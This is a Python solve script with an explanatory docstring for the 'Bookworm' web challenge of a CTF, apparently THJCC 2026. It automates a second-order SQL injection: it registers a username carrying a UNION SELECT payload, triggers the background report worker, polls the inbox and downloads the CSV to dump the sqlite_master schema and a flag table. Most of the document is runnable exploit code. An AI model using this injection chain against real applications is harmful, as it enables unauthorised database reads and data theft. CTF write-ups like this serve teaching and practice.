#!/usr/bin/env python3
"""Bookworm -- THJCC CTF 2026 Summer (web, 351 pts).

A Flask "reading tracker". Sign up (username/email/password), add books, and
click "Generate reading report" -- an *asynchronous background worker* writes a
CSV of your books to /app/reports/reading_<username>_<ms>.csv and drops a row in
your inbox, which you can download.

The bug is a SECOND-ORDER SQL injection. Signup/login use parameterised queries,
so the username is stored verbatim (any characters allowed). But the background
report worker later reads that username back and concatenates it straight into
its book query:

    SELECT title, author, rating FROM books WHERE username = '<username>'   # raw

so a payload planted in the username at signup only detonates when the worker
runs, during report generation. (The alphanumeric sanitiser you can observe on
the report *filename* -- e.g. "aa{{7*7}}bb" -> "aa77bb" -- is a red herring; it
never touches the SQL path.)

UNION-inject three columns (title, author, rating) to exfiltrate anything. The
flag lives in a decoy-named table:

    "bjB0aDFuZ190MF9zMzNfaDNyMw=="   ==  base64("n0th1ng_t0_s33_h3r3")
    columns: (name, value)

Chain: register a UNION username -> log in -> generate report -> download the
CSV; the injected rows appear as book rows.

    python3 solve.py [BASE_URL]

Standard library only.
"""
from __future__ import annotations

import re
import sys
import time
import random
import urllib.parse
import urllib.request
import urllib.error
from http.cookiejar import CookieJar

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chal.thjcc.org:31279"

FLAG_TABLE = "bjB0aDFuZ190MF9zMzNfaDNyMw=="          # base64("n0th1ng_t0_s33_h3r3")


def client():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))


def req(o, path, data=None, timeout=20):
    try:
        if data is not None:
            r = o.open(urllib.request.Request(
                BASE + path, data=urllib.parse.urlencode(data).encode()), timeout=timeout)
        else:
            r = o.open(BASE + path, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def inject(select_sql: str) -> str:
    """Run one UNION SELECT (must yield 3 columns) via the report worker and
    return the generated CSV."""
    user = "z%d' UNION %s-- -" % (random.randint(1000, 9999), select_sql)
    o = client()
    req(o, "/signup", {"username": user, "email": "x@x.com", "password": "Passw0rd1"})
    req(o, "/login",  {"username": user, "password": "Passw0rd1"})
    req(o, "/generate_report", {})                  # kicks off the async worker
    for _ in range(20):                             # poll the inbox for the report
        _, ib = req(o, "/inbox")
        m = re.search(r"download_report/(\d+)", ib)
        if m:
            _, csv = req(o, "/download_report/" + m.group(1))
            return csv
        time.sleep(1)
    raise RuntimeError("report never appeared (worker may have errored)")


def main() -> int:
    # 1) prove the injection + map the schema (optional, informative)
    print("[*] dumping schema via UNION on sqlite_master ...")
    schema = inject("SELECT name, sql, 3 FROM sqlite_master")
    tables = re.findall(r"^([A-Za-z0-9=+/_]+),", schema, re.M)
    print("    tables:", ", ".join(t for t in tables if t != "title"))

    # 2) pull the flag out of the decoy-named table
    print(f'[*] reading the flag table "{FLAG_TABLE}" ...')
    csv = inject(f'SELECT name, value, 3 FROM "{FLAG_TABLE}"')
    print("---- report CSV ----")
    print(csv.strip())

    m = re.search(r"THJCC\{[^}]*\}", csv)
    if m:
        print("\n[+] flag:", m.group(0))
        return 0
    print("\n[-] no flag found")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
